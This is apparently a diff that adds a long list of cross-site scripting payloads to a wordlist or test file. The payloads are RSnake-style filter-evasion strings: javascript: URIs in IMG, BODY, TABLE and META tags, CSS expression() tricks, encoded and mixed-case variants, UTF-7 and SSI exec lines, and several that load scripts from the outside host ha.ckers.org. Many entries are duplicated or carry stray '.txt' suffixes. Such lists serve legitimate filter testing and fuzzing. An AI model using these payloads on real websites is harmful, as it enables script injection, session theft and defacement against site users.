@@ -10,3 +10,98 @@
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG DYNSRC="javascript:alert('XSS');">
+<BGSOUND SRC=\"javascript:alert('XSS');\">.txt
+<BODY BACKGROUND=\"javascript:alert('XSS')\">.txt
+<BODY ONLOAD=alert('XSS')>.txt"
+<BR SIZE=\"&{alert('XSS')}\">.txt"
+<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">.txt
+<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">.txt
+<DIV STYLE=\"width: expression(alert('XSS'));\">.txt
+<IMG DYNSRC=\"javascript:alert('XSS')\">.txt
+<IMG LOWSRC=\"javascript:alert('XSS')\">.txt
+IMG SRC=\" &#14;  javascript:alert('XSS');\">.txt
+<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>.txt
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>.txt
+<IMG SRC=\"javascript:alert('XSS');\">.txt
+<IMG SRC=\"javascript:alert('XSS')\".txt
+<IMG SRC=javascript:alert('XSS')>.txt
+<IMG SRC=javascript:alert(\"XSS\")>.txt
+<IMG SRC=JaVaScRiPt:alert('XSS')>.txt
+<IMG SRC=\"javtascript:alert('XSS');\">.txt
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">.txt
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">.txt
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">.txt
+<IMG SRC=\"livescript:[code]\">.txt
+<IMG SRC='vbscript:msgbox(\"XSS\")'>.txt
+<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">.txt
+<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">.txt
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">.txt
+perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out.txt
+<TABLE BACKGROUND=\"javascript:alert('XSS')\">.txt
+<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">.txt
+<XSS STYLE=\"behavior: url(xss.htc);\">.txt
+<XSS STYLE=\"xss:expression(alert('XSS'))\">.txt
+<IMG SRC=\"javascript:alert('XSS');\">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(\"XSS\")>
+<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>
+<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">
+<IMG SRC=\"jav\tascript:alert('XSS');\">
+<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' >
+<IMG SRC=\" &#14;  javascript:alert('XSS');\">
+<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>
+<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>
+<<SCRIPT>alert(\"XSS\");//<</SCRIPT>
+<IMG SRC=\"javascript:alert('XSS')\"
+\\\";alert('XSS');//
+</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>
+<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">
+<BODY BACKGROUND=\"javascript:alert('XSS')\">
+<IMG DYNSRC=\"javascript:alert('XSS')\">
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>
+<IMG SRC='vbscript:msgbox(\"XSS\")'>
+<IMG SRC=\"livescript:[code]\">
+<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC=\"javascript:alert('XSS');\">
+<BR SIZE=\"&{alert('XSS')}\">
+<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">
+<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>
+<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">
+exp/*<A STYLE='no\\xss:noxss(\"*//*\");\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>
+<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>
+<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>
+<XSS STYLE=\"xss:expression(alert('XSS'))\">
+¼script¾alert(¢XSS¢)¼/script¾"
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
+<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>
+<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
+<TABLE BACKGROUND=\"javascript:alert('XSS')\">
+<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">
+<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">
+<DIV STYLE=\"background-image: url(&#1;javascript:alert('XSS'))\">
+<DIV STYLE=\"width: expression(alert('XSS'));\">
+<!--[if gte IE 4]>\n <SCRIPT>alert('XSS');</SCRIPT>\n <![endif]-->
+<BASE HREF=\"javascript:alert('XSS');//\">
+a=\"get\";\nb=\"URL(\\\"\";\nc=\"javascript:\";\nd=\"alert('XSS');\\\")\";\neval(a+b+c+d);
+<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>\n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>
+<XML SRC=\"xsstest.xml\" ID=I></XML>\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<HTML><BODY>\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\n<?import namespace=\"t\" implementation=\"#default#time2\">\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\n</BODY></HTML>
+<SCRIPT SRC=\"http://ha.ckers.org/xss.jpg\"></SCRIPT>
+<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'\"-->
+<? echo('<SCR)';\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>
+<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">
+<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+;!--\'<XSS>=&{()}\\xss<script>alert('XSS')</script>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+""<SCRIPT>a=/TSS/alert('XSS')</SCRIPT>""
+\\";alert(\'XSS\');//
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
